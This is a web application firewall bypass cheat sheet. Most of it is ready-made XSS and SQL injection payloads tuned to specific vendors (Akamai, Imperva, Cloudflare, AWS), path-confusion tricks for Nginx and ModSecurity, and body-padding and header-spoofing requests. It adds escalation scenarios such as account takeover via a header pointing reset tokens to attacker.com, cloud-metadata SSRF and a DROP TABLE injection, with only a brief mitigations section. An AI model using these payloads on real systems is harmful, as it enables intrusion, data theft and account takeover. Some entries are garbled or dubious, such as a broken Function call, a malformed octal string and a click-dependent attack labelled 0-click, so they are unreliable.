## Overview

Web Application Firewalls (WAFs) are security solutions designed to filter and monitor HTTP traffic between web applications and the Internet. They protect applications from common attacks like XSS, SQL injection, and other malicious activities. However, WAFs can be bypassed through various techniques that exploit inconsistencies in HTTP parsing, character encoding, request manipulation, and header spoofing.

**Key Concepts:**

- WAFs inspect HTTP requests and responses based on predefined rules and patterns
- They often have limitations in request size, parsing logic, and character normalization
- Backend servers may interpret requests differently than WAFs, creating bypass opportunities
- Modern WAFs use contextual analysis, but can still be circumvented through creative encoding and manipulation

---

## Exploitation Methods

### 1. Nginx ACL Rules Bypass via Path Manipulation

**Vulnerability:** Nginx performs path normalization before checking ACL rules, but if the backend server normalizes differently, bypasses are possible.

**Example Nginx Configuration:**

```plaintext
location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
```

**Exploitation Steps:**

#### NodeJS - Express Backend

1. Identify Nginx version
2. Insert bypass characters between path segments
3. Test access to restricted paths

**Bypass Characters by Version:**

- Nginx 1.22.0: `\xA0`
- Nginx 1.21.6: `\xA0`
- Nginx 1.20.2: `\xA0`, `\x09`, `\x0C`
- Nginx 1.18.0: `\xA0`, `\x09`, `\x0C`
- Nginx 1.16.1: `\xA0`, `\x09`, `\x0C`

**Example:** `/admin\xA0` → Bypasses Nginx block, interpreted as `/admin` by Node.js

#### Flask Backend

**Bypass Characters by Version:**

- Nginx 1.22.0: `\x85`, `\xA0`
- Nginx 1.21.6: `\x85`, `\xA0`
- Nginx 1.20.2: `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`
- Nginx 1.18.0: `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`
- Nginx 1.16.1: `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`

#### Spring Boot Backend

**Bypass Characters by Version:**

- Nginx 1.22.0: `;`
- Nginx 1.21.6: `;`
- Nginx 1.20.2: `\x09`, `;`
- Nginx 1.18.0: `\x09`, `;`
- Nginx 1.16.1: `\x09`, `;`

**Example:** `/admin;/` → Bypasses Nginx block

#### PHP-FPM Backend

**Configuration:**

```plaintext
location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```

**Bypass:** `/admin.php/index.php` → Nginx doesn't match exact location, PHP-FPM processes admin.php

---

### 2. ModSecurity Path Confusion

**Vulnerability:** ModSecurity v3 (until 3.0.12) improperly implemented the `REQUEST_FILENAME` variable by URL decoding the path.

**Exploitation:**

```
Request: http://example.com/foo%3f';alert(1);foo=
ModSecurity sees: /foo (stops at decoded ?)
Server receives: /foo%3f';alert(1);foo= (actual path includes payload)
```

**Affected Variables:**

- `REQUEST_FILENAME`
- `REQUEST_BASENAME`
- `PATH_INFO`

**Version 2 Bypass:**

- ModSecurity v2 blocked specific extensions (e.g., `.bak`)
- Bypass: `https://example.com/backup%2ebak` (URL encoded dot)
- ModSecurity doesn't recognize extension, server does

---

### 3. AWS WAF Malformed Header Bypass

**Vulnerability:** AWS WAF failed to properly parse multi-line HTTP headers.

**Exploitation Steps:**

1. Send SQL injection in header with continuation on next line
2. AWS WAF doesn't recognize continuation as part of header value
3. Backend server (e.g., Node.js) parses entire multi-line value

**Example Request:**

```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```

**Result:** AWS WAF sees `X-Query: Value`, Node.js sees `X-Query: Value\t' or '1'='1' --`

---

### 4. Request Size Limit Bypass

**Concept:** WAFs have maximum request body size limits. Requests exceeding these limits may not be fully inspected.

**Exploitation Steps:**

1. Identify WAF request size limit
2. Craft POST/PUT/PATCH request with malicious payload
3. Pad request body with junk data to exceed limit
4. WAF inspects only first N bytes, payload passes through

**Known Limits:**

- **AWS WAF:**
    - Application Load Balancer/AppSync: 8 KB
    - CloudFront/API Gateway/Cognito/App Runner/Verified Access: 64 KB
- **Azure WAF:**
    - CRS 3.1 or lower: 128 KB (if body inspection disabled)
    - CRS 3.2+: Configurable, logs if exceeded
- **Akamai:** 8 KB default, up to 128 KB with Advanced Metadata
- **Cloudflare:** 128 KB

**Tool:** [nowafpls](https://github.com/assetnote/nowafpls) - Burp plugin to add junk data

---

### 5. Static Asset Inspection Gaps

**Vulnerability:** Some CDN/WAF stacks apply weak or no inspection to GET requests for static assets (e.g., `.js` files).

**Exploitation Steps:**

1. Send malicious payload in headers (e.g., `User-Agent`) to static asset path (`.js`)
2. WAF doesn't inspect content thoroughly for static assets
3. Immediately request main HTML page
4. Cached variant influenced by malicious request
5. Payload reflected in HTML response

**Requirements:**

- Clean IP address (not flagged)
- Parallel requests (race condition)
- Auto-caching enabled for static extensions

**Use Case:** Header-reflection cache poisoning

**Example Flow:**

```
1. GET /static/app.js with X-Forwarded-Host: evil.com
2. GET /index.html (immediately after)
3. Cached HTML reflects evil.com in links/resources
```

---

### 6. HTTP Header Manipulation (Password Reset Poisoning)

**Vulnerability:** Applications trust client-controlled headers for constructing URLs, particularly in password reset functionality.

**Exploitation Steps:**

1. Intercept password reset request
2. Add/modify headers to point to attacker-controlled domain
3. Victim receives password reset email with poisoned link
4. Victim clicks link, token sent to attacker

**Example Request:**

```http
POST /reset-password HTTP/1.1
Host: victim-site.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

email=victim@victim.com
```

**Result:** Reset link becomes `https://attacker.com/reset?token=abcdef123456`

---

## Bypasses

### Unicode Compatibility Normalization

**Concept:** Characters sharing Unicode compatibility can bypass WAF filters while executing as intended payload.

**Exploitation:**

- Use Unicode-compatible characters that normalize to malicious characters
- WAF sees safe characters, application normalizes to dangerous ones

**Example (NFKD normalization):**

```
Input: ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥
Output: <img src=p onerror='prompt(1)'>
```

**Resource:** [Unicode Compatibility Characters](https://www.compart.com/en/unicode)

---

### Contextual WAF Bypass via Multiple Encodings

**Concept:** Abuse WAF normalization/decoding to hide payloads that remain encoded for victim.

**Example - Akamai (10x URL decode):**

```
Input: <input/%2525252525252525253e/onfocus
Akamai sees after 10 decodes: <input/>/onfocus (safe, tag closed)
Victim sees: <input/%25252525252525253e/onfocus (valid XSS)
```

**Other Encoding Types:**

- Unicode: `\u003c` → `<`
- Hex: `\x3c` → `<`
- Octal: `\074` → `<`
- HTML entities: `&#60;` → `<`

**Specific WAF Bypasses:**

**Akamai:**

```html
<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>
```

**Imperva:**

```html
<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">
```

**AWS/CloudFront:**

```html
<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>
```

**Cloudflare:**

```html
<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">
```

---

### Context Confusion Bypasses

**SQL Injection - Akamai Comment Abuse:**

```sql
/*'or sleep(5)-- -*/
```

- Akamai allows anything between `/*` and `*/`
- `/*` starts injection, `*/` is commented out in SQL
- Valid SQL injection that bypasses WAF

---

### Obfuscation Techniques

**IIS/ASP Classic:**

```html
<%s%cr%u0131pt> == <script>
```

**Tomcat Path Blacklist:**

```
/path1/path2/ == ;/path1;foo/path2;bar/;
```

---

### Regex Filter Bypasses

**Case Alternation:**

```html
<sCrIpT>alert(XSS)</sCriPt>
```

**Tag Manipulation:**

```html
<<script>alert(XSS)</script>         # Double open bracket
<script>alert(XSS) //                # Remove closing tag
<script>alert`XSS`</script>          # Backticks instead of parentheses
```

**Encoding:**

```html
java%0ascript:alert(1)               # Newline character
```

**Uncommon Tags:**

```html
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE>
```

**Space Bypass:**

```html
<img/src=1/onerror=alert(0)>
```

**Attribute Stuffing:**

```html
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a>
```

**Alternative Functions:**

```javascript
Function("ale"+"rt(1)")();
new Function`alt\`6\``;
```

**Octal Encoding:**

```javascript
javascript:74163166147401571561541571411447514115414516216450615176
```

**Base64 Data URI:**

```html
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
```

**HTML Encoding:**

```
%26%2397;lert(1)
```

**Line Feed (LF) Breaks:**

```html
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)">
```

**SQL Comment Injection:**

```sql
/?id=1+un/**/ion+sel/**/ect+1,2,3--
```

**Gecko Engine (Firefox) Special:**

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>
```

(Any non-alphanumeric chars between event handler and `=`)

---

### IP Rotation and Proxy Techniques

**Tools:**

- **FireProx:** Generate AWS API Gateway URLs for IP rotation
- **CatSpin:** Similar to FireProx
- **IP Rotate (Burp):** Uses AWS API Gateway IPs
- **ShadowClone:** Parallel execution with container instances

**Use Case:** Bypass rate limiting and IP-based blocking

---

### H2C Smuggling

**Concept:** Upgrade HTTP/1.1 connection to HTTP/2 Cleartext (H2C) to bypass WAF inspection.

**Requirements:**

- Server supports H2C
- WAF doesn't properly handle protocol upgrade

**Exploitation:** Send malicious payloads in HTTP/2 frames that WAF doesn't inspect.

---

## Payloads

### 1. XSS - Unicode NFKD Bypass

```html
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥
```

### 2. XSS - Multiple Encoding (Akamai)

```html
<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>
```

### 3. XSS - Transition Event (Cloudflare)

```html
<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">
```

### 4. XSS - Case Alternation

```html
<sCrIpT>alert(document.domain)</sCriPt>
```

### 5. XSS - Alternative Function

```javascript
Function("ale"+"rt(document.domain)")();
```

### 6. XSS - Backtick Syntax

```javascript
new Function`alt\`document.domain\``;
```

### 7. SQL Injection - Comment Bypass

```sql
/*'or sleep(5)-- -*/
```

### 8. SQL Injection - Comment Obfuscation

```sql
1+un/**/ion+sel/**/ect+1,2,3--
```

### 9. Path Traversal - Nginx/Spring Boot

```
/admin;/
```

### 10. Path Traversal - PHP-FPM

```
/admin.php/index.php
```

---

## Higher Impact Scenarios

### 1. Password Reset Poisoning → Account Takeover

**Impact:** Complete account takeover without user interaction (0-click)

**Attack Flow:**

1. Trigger password reset for target account
2. Inject `X-Forwarded-Host: attacker.com` header
3. Victim receives email with poisoned reset link
4. Token captured when victim clicks link
5. Attacker resets password and gains full access

**Escalation:**

- Target admin accounts for privilege escalation
- Chain with CSRF for automated exploitation
- Use in password recovery flows that don't require email verification

---

### 2. SSRF via Header Injection

**Impact:** Access internal services, cloud metadata, and sensitive infrastructure

**Exploitation:**

```http
GET /api/v1/fetch HTTP/1.1
Host: target.com
X-Forwarded-For: 169.254.169.254
X-Real-IP: 169.254.169.254
```

**Targets:**

- AWS Metadata: `169.254.169.254/latest/meta-data/`
- Azure Metadata: `169.254.169.254/metadata/instance`
- GCP Metadata: `metadata.google.internal/computeMetadata/v1/`
- Internal services: `127.0.0.1:port`, `localhost:port`

**Impact:**

- Steal cloud credentials (AWS keys, service tokens)
- Access internal APIs and databases
- Port scanning of internal network
- Read sensitive configuration files

---

### 3. Admin Panel Access via IP Spoofing

**Impact:** Unauthorized access to administrative functions

**Exploitation:**

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.100
X-Real-IP: 10.0.0.1
Client-IP: 127.0.0.1
```

**Bypass Scenarios:**

- IP whitelisting based on trusted headers
- Internal network restrictions
- VPN/proxy detection bypasses
- Geographic restrictions

**Escalation:**

- Access user management functions
- Modify application settings
- View sensitive logs and analytics
- Deploy malicious configurations

---

### 4. Cache Poisoning via Static Asset Bypass

**Impact:** Persistent XSS affecting all users, widespread phishing

**Attack Flow:**

1. Send malicious header to `.js` endpoint
2. Race condition with HTML request
3. Cached variant contains attacker-controlled content
4. All subsequent users receive poisoned response

**Use Cases:**

- Inject malicious JavaScript globally
- Redirect users to phishing pages
- Steal session tokens from all visitors
- Deface website for all users

---

### 5. Authentication Bypass via Request Smuggling

**Impact:** Access protected resources, impersonate users

**Technique:** Combine H2C smuggling with path confusion

**Example:**

1. Upgrade to H2C protocol
2. WAF inspects HTTP/1.1, doesn't see HTTP/2 frames
3. Backend receives smuggled request with admin path
4. Bypass authentication checks

**Targets:**

- OAuth flows
- API authentication
- Session management
- Multi-factor authentication

---

### 6. SQL Injection with Size Limit Bypass

**Impact:** Full database compromise

**Exploitation:**

1. Craft SQL injection payload
2. Pad request body to exceed WAF limit (>128KB)
3. WAF inspects only first 8-64KB
4. Malicious SQL in remaining bytes executes

**Attack:**

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 150000

query=legitimate_data[padding to 128KB]'; DROP TABLE users; --
```

**Impact:**

- Extract entire database
- Modify/delete records
- Execute OS commands (if permissions allow)
- Pivot to internal network

---

## Mitigations

### For Nginx Path Confusion

```plaintext
# Use regex to match path prefix instead of exact match
location ~* ^/admin {
    deny all;
}
```

### For ModSecurity

- Upgrade to ModSecurity v3.0.13+
- Validate paths before URL decoding
- Use normalized path variables

### For AWS WAF Header Bypass

- Validate and sanitize all HTTP headers
- Don't trust client-controlled headers for URL construction
- Use server-side URL generation only

### For Request Size Limits

- Enforce maximum request sizes at application level
- Log and block oversized requests
- Don't rely solely on WAF for size validation

### For Static Asset Bypass

- Apply full inspection to all requests regardless of extension
- Implement proper cache key design
- Validate headers even for static resources

### For Header Manipulation

**Headers to Never Trust:**

```
X-Forwarded-Host
X-Forwarded-For
X-Real-IP
Client-IP
X-Original-URL
X-Rewrite-URL
Referer
Origin
```

**Secure Configuration:**

- Use application-level checks for sensitive operations
- Validate host header against whitelist
- Construct URLs server-side only
- Implement CSRF tokens
- Use cryptographically signed URLs for password resets

### General Best Practices

1. **Defense in Depth:** Don't rely solely on WAF
2. **Input Validation:** Validate at application layer
3. **Output Encoding:** Context-aware encoding for all outputs
4. **Least Privilege:** Minimal permissions for application components
5. **Security Headers:** Implement CSP, X-Frame-Options, etc.
6. **Regular Updates:** Keep WAF rules and software current
7. **Logging & Monitoring:** Track bypass attempts and anomalies
8. **Rate Limiting:** Implement at application level
9. **Network Segmentation:** Isolate sensitive services
10. **Security Testing:** Regular penetration testing and code review

---

## References

- [Exploiting HTTP Parsers Inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [ModSecurity Path Confusion Bugs](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [Bypassing WAFs via Character Normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization)
- [0-Click Account Takeover via Header Manipulation](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

## Tools

- [nowafpls](https://github.com/assetnote/nowafpls) - Burp plugin for request size bypass
- [FireProx](https://github.com/ustayready/fireprox) - AWS API Gateway IP rotation
- [CatSpin](https://github.com/rootcathacking/catspin) - IP rotation alternative
- [IP Rotate](https://github.com/PortSwigger/ip-rotate) - Burp Suite IP rotation
- [ShadowClone](https://github.com/fyoorer/ShadowClone) - Parallel request execution
